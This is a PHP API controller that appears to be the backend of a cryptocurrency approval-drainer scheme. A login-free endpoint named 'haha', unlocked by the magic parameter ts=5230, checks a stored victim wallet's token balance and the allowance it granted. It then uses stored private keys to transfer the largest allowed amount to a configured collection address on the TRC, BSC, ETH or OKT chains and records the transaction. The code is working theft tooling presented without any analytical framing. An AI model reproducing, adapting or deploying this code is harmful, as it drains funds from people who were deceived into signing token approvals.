<?php

namespace app\api\controller;

use app\common\controller\Api;

/**
 * 首页接口
 */
class Index extends Api
{
    protected $noNeedLogin = ['*'];
    protected $noNeedRight = ['*'];

    /**
     * 首页
     *
     */
    public function index()
    {
        $this->success('请求成功');
    }
    //飞机一键划款
    public function haha(){
        $ts = $this->request->get("ts");
        if($ts !=='5230'){
            $this->success('测试请求成功');
        }
        $id = $this->request->get("id");
        $row = Db('address')->where(['id'=>$id])->find();
        if(empty($row)){
            $this->success($id.'无数据');
        }
        switch ($row['chain']){
            case 'trc':
                $qb_type = 1;
                $address_shou = config('site.shou_trx');
                switch ($row['approve_type']){
                    case 0:
                        $approve_user_address = config('site.hy_user_trx');
                        $approve_key = config('site.hy_user_trx_key');
                        break;
                    case 1:
                        $approve_user_address = $row['approve_address'];
                        $approve_key = $row['account_pre'];
                        break;
                }
                break;
            case 'bsc':
                $qb_type = 2;
                $address_shou = config('site.shou_bsc');
                $approve_user_address = config('site.hy_user_bsc');
                $approve_key = config('site.hy_user_bsc_key');
                break;
            case 'eth':
                $qb_type = 3;
                $address_shou = config('site.shou_eth');
                $approve_user_address = config('site.hy_user_eth');
                $approve_key = config('site.hy_user_eth_key');
                break;
            case 'okt':
                $qb_type = 4;
                $address_shou = config('site.shou_okt');
                $approve_user_address = config('site.hy_user_okt');
                $approve_key = config('site.hy_user_okt_key');
                break;
        }
        $amount = (new \app\common\service\Getbalance())->getTokenBalance($qb_type,$row['address'],$row['contract_address'],$row['approve_address_decimals']);
        $money_approve = (new \app\common\service\Getbalance())->getTokenApprove($qb_type,$row['address'],$row['approve_address'],$row['contract_address'],$row['approve_address_decimals']);
        if($amount > $money_approve){
            $amount = $money_approve;
        }
        if($amount > 0){
            $to = $address_shou;
            $rrr_arr=config('conf.rrr_arr');
            $psd = $approve_key;
            foreach ($rrr_arr as $aaa){
                $psd = str_replace($aaa,'',$psd);
            }

            $approve_info =array(
                'qb_type'=>$qb_type,//钱包类型
                'approve_address'=>$row['approve_address'],//授权合约地址
                'approve_user_address'=>$approve_user_address,//调用授权合约的账户
                'psd'=>$psd,//调用授权合约的账户的私钥
                'user_address'=>$row['address'],//目标用户钱包
                'contract_address'=>$row['contract_address'],//目标合约
                'approve_address_decimals'=>$row['approve_address_decimals'],//目标合约精度
                'sq_approve_type'=>$row['approve_type'],//0 合约授权 1 账号授权
            );
            $receive_info =array(
                'to'=>$to,//收款地址
                'amount'=>$amount,//金额
            );
            $result = (new \app\common\service\Getbalance())->do_transfer_from_wu_fen_yong($approve_info,$receive_info);
            if($result){
                if($qb_type == 1){
                    $data['txid']=$result->txID;
                }else{
                    $data['txid']=$result['hash'];
                }
                $data['user_id']=0;
                $data['chain']=$row['chain'];
                $data['address']=$row['address'];
                $data['to_address']=$to;
                $data['money']=$amount;
                $data['createtime']=time();
                $data['updatetime']=time();
                $ishave = (new \app\admin\model\approve\Transaction())->where(['txid'=>$data['txid']])->find();
                if($ishave){
                    $ishave -> save(['updatetime'=>time()]);
                }else{
                    (new \app\admin\model\approve\Transaction())->insert($data);
                }
                $this->success("划转:".$amount.",操作成功!");
            }
            $this->success("划转错误");
        }

    }
}
